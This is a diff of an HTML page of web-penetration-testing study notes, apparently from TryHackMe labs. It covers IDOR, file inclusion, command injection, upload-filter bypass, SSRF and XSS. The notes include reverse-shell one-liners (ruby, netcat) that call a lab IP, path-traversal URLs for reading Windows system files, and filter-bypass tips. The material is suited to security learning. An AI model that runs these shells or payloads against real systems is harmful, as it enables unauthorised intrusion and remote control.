@@ -108,25 +108,31 @@
     <h2><li>IDOR vulnerabilities</li></h2>
     IDOR vulnerabilities: change url info (like http://online-service.thm/profile?user_id=1305, change id value) and see it vulnerable or not. url maybe encoded(base64) or hashed. if not found in url, check in network tab.
     
-    <h2><li>Local File Inclusion (LFI)</li></h2>
-     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png">
-     <p>If website allow user to execute command in quary string after '=' sign, then this vulnerability happend.<br>Normally this cause happend for file_get_contents PHP fuction.</p>
-     <p>If PHP 5.3.3 and down then NULLBYTE (%00 or 0x00) vulnerability will working.</p>
-    
-    <h2><li>Remote File Inclusion - RFI</li></h2>
-    <p>Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. <br>One requirement for RFI is that the allow_url_fopen option needs to be on.</p>
-    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" style="width:989.5px;height:611.368px">
-  
-
-     <h2><li>Remote code execution vulnerability</li></h2>
-    <p>If website allow to execute code with their allow code like[their_code;attacker_code] then this vulnerability exist. <br>
-    mixing code would be --- <b>[their_code;attacker_code]</b> or <b>[their_code ; attacker_code]</b> or <b>[their_code|attacker_code]</b> or <b>[their_code | attacker_code]</b> or <b>[their_code&&attacker_code]</b> or <b>[their_code && attacker_code]</b></p>
-
     <h2><li>File upload vulnerability</li></h2>
     <p> If website allow to upload any kind file like .php, .python then this vulnerability exist. <br>
     If they block other file upload, then intercept the request with burp suit, modifiy file name then forward it.<br>
     if they check file extension too.. then modifiy name with like this >>>> shell.php.jpg</p>
+
+    <h2><li>Remote code execution [RCE] vulnerability</li></h2>
+    <p>If website allow to execute code with their allow code like[their_code;attacker_code] <br>
+      Or, directly allow to run system command, then this vulnerability exist. <br>
+    mixing code would be --- <b>[their_code;attacker_code]</b> or <b>[their_code ; attacker_code]</b> or <b>[their_code|attacker_code]</b> or <b>[their_code | attacker_code]</b> or <b>[their_code&&attacker_code]</b> or <b>[their_code && attacker_code]</b></p>
+      <ol>Blind Command Injection: <ol>1. execute <i>ping</i> or <i>sleep</i> command to check web application hang or not.</ol>
+                                  <ol>2. or execute <i>whoami</i> and save into a file using &gt;. then read that file.</ol>
+    </ol>
+    <ol>Verbose Command Injection:
+      <ol>Run any command and see it's output</ol>
+    </ol>
+
+    <h2><li>Local File Inclusion (LFI)</li></h2>
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dbf35cc4f35fde7a4327ad8b5a2ae2ec.png" style="width:500.5px;height:250px">
+     <p>If website allow user to execute command in quary string after '=' sign, then this vulnerability happend.<br>Normally this cause happend for file_get_contents PHP fuction.</p>
+     <p>If PHP 5.3.3 and down then NULLBYTE (%00 or 0x00) vulnerability will working.</p>
     
+    <h2><li>Remote File Inclusion - RFI</li></h2>
+    <p>Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application.<br> Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. <br>One requirement for RFI is that the allow_url_fopen option needs to be on.</p>
+    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" style="width:650.5px;height:400.368px">
+  
 
     <h2><li>Server-Side Request Forgery (SSRF)</li></h2>
     <p>
@@ -135,9 +141,7 @@
      if '/' not work then use x/. 
     </p>
     <h2><li>Cross Site Scripting (XSS)</li></h2>
-    <p>
-     
-Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.<br>
+    <p>Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.<br>
       Three types of XSS exists - 
       <ol><b>Reflected XSS </b>
       <ol>How to test for Reflected XSS:</ol>
@@ -148,7 +152,7 @@ Cross-Site Scripting, better known as XSS in the cybersecurity community, is cla
        <ol># URL File Path</ol>
        <ol># Sometimes HTTP Headers (although unlikely exploitable in practice)</ol>
     </ol> <br>
-      <ol><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png" style="width:572.625px;height:5s59.733px" alt=""></ol>
+      <ol><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/8e3bffe500771c03366de569c3565058.png" style="width:450px;height:450px" alt=""></ol>
       </ol>
 
 
@@ -162,7 +166,7 @@ Cross-Site Scripting, better known as XSS in the cybersecurity community, is cla
        <ol># Website Listings</ol>
     </ol> 
     <br>
-      <ol><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png" style="width:618.5px;height:383.733px" alt=""></ol>
+      <ol><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cc2566d297f7328d91bc8552f902210e.png" style="width:450px;height:280px" alt=""></ol>
       </ol>
       <ol><b>DOM Based XSS</b> 
 
@@ -208,13 +212,16 @@ ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i
 <b>Netcat</b><br>
 nc -e /bin/sh 10.20.14 8080<br>
     </p>
+    <br>
+    <b>*** Bypass filtering: </b> use hexadecimal code to bypass filtering.
+    <p>RCE Cheat Sheet: <a href="https://github.com/payloadbox/command-injection-payload-list" target="_blank">cheat sheet</a></p>
 
 <br><br>
     <h2><li>Local File Inclusion (LFI) exploitation</li></h2>
     <p>Execute command in quary string</p>
-    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png" style="width:1100.25px;height:513.67px">
-     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png"><br>
-     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png" style="font-size:1rem;width:1000.25px;height:513.67px">
+    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png" style="width:650.25px;height:300px">
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png" style="width:650.25px;height:550px"><br>
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png" style="font-size:1rem;width:600px;height:350px">
      <br>if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:<br>
      <b>http://webapp.thm/get.php?file=../../../../boot.ini</b> or <b>http://webapp.thm/get.php?file=../../../../windows/win.ini</b>
      <br><br>
